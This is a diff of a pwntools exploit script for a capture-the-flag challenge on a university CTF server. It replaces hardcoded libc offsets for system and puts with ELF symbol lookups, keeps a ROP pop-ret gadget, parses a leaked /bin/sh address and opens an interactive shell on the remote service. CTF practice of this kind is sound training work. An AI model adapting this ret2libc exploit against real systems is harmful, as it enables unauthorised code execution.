@@ -1,5 +1,4 @@
 from pwn import *
-import struct
 
 BINARY = ['./chall']
 IP, PORT = 'ctf99.cs.ui.ac.id', 10017
@@ -16,10 +15,10 @@ if LOCAL:
 else:
     p = remote(IP, PORT)
 e = ELF('chall')
+libc = ELF('libc-2.27.so')
 
-
-base_system = 0x0003d3d0  # readelf -s libc-2.27.so | grep system
-base_puts = 0x00067d90    # readelf -s libc-2.27.so | grep puts
+base_system = libc.symbols['system']  # readelf -s libc-2.27.so | grep system
+base_puts = libc.symbols['puts']    # readelf -s libc-2.27.so | grep puts
 popret = p32(0x0804861b)  # ropper --file chall --search pop
 
 bin_sh_raw = p.recvline().decode().strip().split(" ")[-1]
@@ -45,4 +44,4 @@ if LOCAL:
     pause()
 else:
     p.interactive()
-    print(p.recvall())
+    # print(p.recvall())
